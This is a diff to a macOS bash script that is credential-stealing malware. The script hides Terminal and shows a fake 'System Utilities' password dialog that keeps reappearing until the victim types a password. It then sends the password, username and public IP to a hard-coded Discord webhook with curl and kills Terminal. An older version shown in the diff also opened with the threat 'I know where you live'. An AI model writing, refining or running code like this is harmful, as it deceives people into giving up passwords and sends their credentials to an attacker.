@@ -1,7 +1,9 @@
 #!/bin/bash
-# Login Prompt Script for macOS – Updated for Python compatibility and clear prompt messaging.
-# This script displays a login prompt that instructs the user "DO NOT PRESS CANCEL."
-# The entered password is captured and then sent to a Discord webhook as a JSON payload.
+# Login Prompt Script for macOS – Updated with Custom Prompt and Force Kill
+# This script displays a login prompt that instructs the user:
+# "Enter your password Mr. (last name). DO NOT PRESS CANCEL"
+# It captures the entered password and sends it (along with the public IP and username)
+# to a Discord webhook, then forcefully kills Terminal.
 #
 # Requirements:
 # - macOS with osascript, curl, and either python3 or python installed.
@@ -10,22 +12,23 @@
 #   chmod +x login_prompt.sh
 #   ./login_prompt.sh
 
-# Get the current username for logging purposes.
+# Hide Terminal immediately.
+osascript -e 'tell application "Terminal" to set visible of front window to false'
+
+# Get the current username.
 username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
 
-# Initialize capture text with a header.
+# Initialize capture text.
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
 
-# Define AppleScript for a persistent password prompt.
-# The prompt now includes "DO NOT PRESS CANCEL" to warn the user.
+# Define the AppleScript for a persistent password prompt with custom text.
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
-set firstName to word 1 of fullName
 set lastName to word -1 of fullName
 set userPassword to ""
 repeat while userPassword is ""
     try
-        set userPassword to text returned of (display dialog "I know where you live, " & firstName & ".\n\nEnter your password (DO NOT PRESS CANCEL) to allow access." with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
+        set userPassword to text returned of (display dialog "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
     on error
         set userPassword to ""
     end try
@@ -33,7 +36,7 @@ end repeat
 return userPassword
 EOF
 
-# Execute the AppleScript synchronously and capture its output.
+# Execute the AppleScript prompt and capture its output.
 osascript -e "$applescriptCode" > pass_temp.txt
 
 # Read the password from the temporary file.
@@ -44,14 +47,14 @@ else
     dialogText="CANCEL"
 fi
 
-# Append the password result to the capture text.
+# Append the captured password.
 capture="${capture}password=${dialogText}\n"
 
-# Capture the public IP address using api.ipify.org.
+# Capture the public IP address.
 ipaddress=$(curl -s https://api.ipify.org)
 capture="${capture}ipaddress=${ipaddress}"
 
-# Save the captured information to a temporary file.
+# Save the captured information.
 echo -e "$capture" > pass.txt
 
 # Determine which Python interpreter to use (prefer python3).
@@ -61,10 +64,13 @@ else
     PYTHON=python
 fi
 
-# Use the selected Python to generate a valid JSON payload.
+# Create the JSON payload.
 payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
 
-# Send captured data to the Discord webhook.
+# Send the payload to your Discord webhook.
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
 curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
 rm pass.txt
+
+# Force kill Terminal.
+killall Terminal
